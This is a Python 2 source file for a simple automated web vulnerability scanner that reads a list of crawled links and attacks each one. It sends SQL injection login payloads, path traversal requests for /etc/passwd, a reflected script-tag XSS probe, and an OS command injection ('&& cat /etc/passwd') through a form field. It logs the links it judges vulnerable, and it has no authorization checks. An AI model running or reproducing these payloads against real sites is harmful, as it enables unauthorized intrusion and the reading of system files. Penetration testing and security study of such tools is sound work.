import urllib


"""
SQL injection Function
"""


def sql_inject(name):

    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    f = open(path, 'r')

    for link in f:

        print("Starting SQL Injection....")

        errors = ["MySQl", "error in your SQL"]

        print("[-] Testing Errors: "+link)
        data = urllib.urlencode({"username": "' or 1=1'", "password": "' or 1=1'"})
        request = urllib.urlopen(link, data)
        page = request.read()

        newfile = root_folder + "/" + name + "/" + "sqli.txt"

        for x in errors:
            if x in page:
                g = open(newfile, 'a')

                g.write(
                    "\033[01;31mVulnerability Found in: \033[00m\n"
                    "\033[01;31m[*] SQL Injection Found : "+link + "\033[00m\n"
                )

                print("\033[01;31mVulnerability Found in: \033[00m\n")
                print("\033[01;31m[*] SQL Injection Found : " + link + "\033[00m\n")

"""
Path Traversal Function
"""


def path_traversal(name):

    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    f = open(path, 'r')

    for line in f:

        contains = "root:"
        if "page=" in line:

            newfile = root_folder + "/" + name + "/" + "pathtraversal.txt"
            g = open(newfile, "a")
            page = "page=".join(line.split("page=")[:-1])

            q1 = page+"page=../etc/passwd"
            request = urllib.urlopen(q1)
            res = request.read()

            if contains in res:

                found = "\033[01;31m[+] Path Traversal Found : " + q1 + "\033[00m\n"
                g.write(found + "\n")
                print(found)

            else:
                notfound = "[*] Path Traversal Not Found : " + q1
                g.write(notfound+"\n")
                print(notfound)

                q2 = page + "page=../../etc/passwd"
                request = urllib.urlopen(q2)
                res2 = request.read()
                if contains in res2:
                    found = "\033[01;31m[+] Path Traversal Found : " + q2 + "\033[00m\n"
                    g.write(found + "\n")
                    print(found)

                else:
                    notfound = "[*] Path Traversal Not Found : " + q2
                    g.write(notfound + "\n")
                    print(notfound)

                    q3 = page + "page=../../../etc/passwd"
                    request = urllib.urlopen(q3)
                    res3 = request.read()
                    if contains in res3:
                        found = "\033[01;31m[+] Path Traversal Found : " + q3 + "\033[00m\n"
                        g.write(found + "\n")
                        print(found)

                    else:
                        notfound = "[*] Path Traversal Not Found : " + q3
                        g.write(notfound + "\n")
                        print(notfound)
        g.close()


def cross_site_script(name):
    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    f = open(path, 'r')

    for line in f:

        payload = "<script>alert('XSS')</script>"
        url = line+payload

        request = urllib.urlopen(url)
        res = request.read()

        newfile = root_folder + "/" + name + "/" + "xss.txt"
        g = open(newfile, "a")

        if payload in res:

            print("\033[01;31m[*] XSS Vulnerability Found: \033[00m"+line)
            g.write("\033[01;31m[*] XSS Vulnerability Found: \033[00m"+line)
        else:
            print("[-] XSS Not Vulnerability Found: "+line)


def remote_code_injection(name):

    root_folder = 'sites'
    path = root_folder + "/" + name + "/" + "crawled.txt"

    f = open(path, 'r')

    for link in f:

        print("Remote Code Injection....")

        errors = ["root:"]

        print("[-] Testing Remote Code: " + link)
        data = urllib.urlencode({"target_host": "&& cat /etc/passwd", "dns-lookup-php-submit-button": "Lookup+DNS"})
        request = urllib.urlopen(link, data)
        page = request.read()

        newfile = root_folder + "/" + name + "/" + "remotecodeinjection.txt"

        for x in errors:
            if x in page:
                g = open(newfile, 'a')

                g.write(
                    "\033[01;31mVulnerability Found in: \033[00m\n"
                    "\033[01;31m[*] Remote Code Injection Found : " + link + "\033[00m\n"
                )

                print("\033[01;31mVulnerability Found in: \033[00m\n")
                print("\033[01;31m[*] Remote Code Injection Found : " + link + "\033[00m\n")
